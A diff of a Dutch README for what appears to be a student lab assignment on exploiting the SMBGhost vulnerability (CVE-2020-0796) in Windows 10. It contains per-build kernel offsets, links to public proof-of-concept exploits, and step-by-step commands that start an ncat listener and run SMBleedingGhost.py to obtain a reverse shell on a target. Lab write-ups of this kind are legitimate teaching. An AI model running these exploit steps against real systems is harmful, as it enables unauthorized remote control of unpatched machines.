@@ -45,17 +45,16 @@ Alle informatie en documentatie is beschikbaar op onze github repo:
 
 ## Inleiding
 
-De scripts die we gebruiken voor de aanval zijn beschikbaar op onze [Github](https://github.com/abdulnsh/cybersecurity_vr_opdracht).  
-
-Hier vermelden we toch voor de zekerheid onze gebruikte bronnen: 
+Hier vermelden onze gebruikte bronnen: 
 - [RCE-script](https://github.com/jamf/CVE-2020-0796-RCE-POC/tree/master)
 - [Vulnerability Scanner](https://github.com/ButrintKomoni/cve-2020-0796)
 - [Extra](https://github.com/jiansiting/CVE-2020-0796-Scanner) (niet nodig, ter info)
 
-### Offsets informatie
-Voor elke versie van Windows 10 hebben we eerst hun offsets nodig. De offsets zijn specifieke waarden dat gebruikt moeten worden in het main Python script ('SMBLeedingGhost.py') voor de exploit. De offsets worden dan gebruikt om het main script aan te passen om een successvolle RCE uit te voeren.  
+### Offsets informatie en uitleg
+Voor elke versie van Windows 10 hebben we eerst hun offsets nodig.   
+Offsets zijn specifieke geheugenadressen binnen bepaalde DLL's of system modules op een Windows-machine. Deze adressen worden gebruikt door het Python-script [SMBLeedingGhost.py](https://github.com/abdulnsh/cybersecurity_vr_opdracht/blob/main/aanval_script/rce/SMBleedingGhost.py) om specifieke functies of gegevens in het geheugen te benaderen en te manipuleren, wat nodig is voor het uitvoeren van de exploit.
 
-calculate_target_offsets.bat is een script dat die offsets kan berekenen en die gelden voor elke Windows 10 die dezelfde versie runt. Hier zijn enkele offset-waarden:
+[calculate_target_offsets.bat](https://github.com/abdulnsh/cybersecurity_vr_opdracht/blob/main/aanval_script/rce/calc_target_offsets.bat) is een script dat die offsets kan berekenen en die gelden voor elke Windows 10 die dezelfde versie runt. Hier zijn enkele offset-waarden: (ter info)
 
 | Windows 10 (Version 1909) Builds | V10.0.18363.418 | V10.0.18363.535 - V10.0.18363.628 | V10.0.18363.693 | V10.0.18363.752 | V10.0.18363.365 |
 | -------------------------------- | --------------- | --------------------------------- | --------------- | --------------- | --------------- |
@@ -65,15 +64,19 @@ calculate_target_offsets.bat is een script dat die offsets kan berekenen en die 
 | nt!IoSizeofWorkItem              | 0x12C380        | 0x12C400                          | 0x6D7A0         | 0x12C410        | 0x12C370        |
 | nt!MiGetPteAddress               | 0xBADC8         | 0xBA9F8                           | 0xF1D28         | 0xBA968         | 0xBAFA8         |
 
-Voor onze versie (18363.365) hebben we deze nodig :
+Voor onze versie (18363.365) hebben we de volgende nodig :
 
-- 'srvnet!SrvNetWskConnDispatch': 0x2D170,
-- 'srvnet!imp_IoSizeofWorkItem': 0x32210,
-- 'srvnet!imp_RtlCopyUnicodeString': 0x32288,
-- 'nt!IoSizeofWorkItem': 0x12C370,
-- 'nt!MiGetPteAddress': 0xBAFA8
+* 'srvnet!SrvNetWskConnDispatch': 0x2D170,   
+=> Deze offset wijst bijvoorbeeld naar een functie in de srvnet module die wordt gebruikt voor het dispatchen van netwerkverbindingen. Het offsetadres, in dit geval 0x2D170, geeft de locatie aan van deze functie in het geheugen
+* 'srvnet!imp_IoSizeofWorkItem': 0x32210,
+* 'srvnet!imp_RtlCopyUnicodeString': 0x32288,
+* 'nt!IoSizeofWorkItem': 0x12C370,
+* 'nt!MiGetPteAddress': 0xBAFA8
+
+Deze offsets zijn van cruciaal belang voor het script om de juiste functies en gegevens te vinden en te manipuleren voor het uitvoeren van de exploit.
 
 ### Stap 1: Git clone op Kali Linux 
+* Voor de makkelijke werking is het handig om de volgende repo's te clonen.
 * Clone de volgende github repository in de Desktop :
 
 1. `cd Desktop`
@@ -118,9 +121,9 @@ Vulnerable
 ### Stap 3: Remote excecution uitvoeren
 * Open een terminal op de Kali Linux en voer de volgende commando's uit.
 * `ncat -lvp <port>` : Dit zal onze toegang zijn naar onze windows (dit kan ncat -lvp 1234 zijn)
-* `SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`
-* `target_ip` = 192.168.1.17  
-  `reverse_shell_ip` en `reverse_shell_port`= ip address en poort waarop ncat luistert.
+* `SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>`  
+=>`target_ip` = 192.168.1.17    
+=>`reverse_shell_ip` en `reverse_shell_port`= ip address en poort waarop ncat luistert.
 * Het commando ziet er dus als volgt uit: `python3 SMBleedingGhost.py 192.168.1.17 192.168.1.20 1234`
 
 ### Stap 4: Resultaat
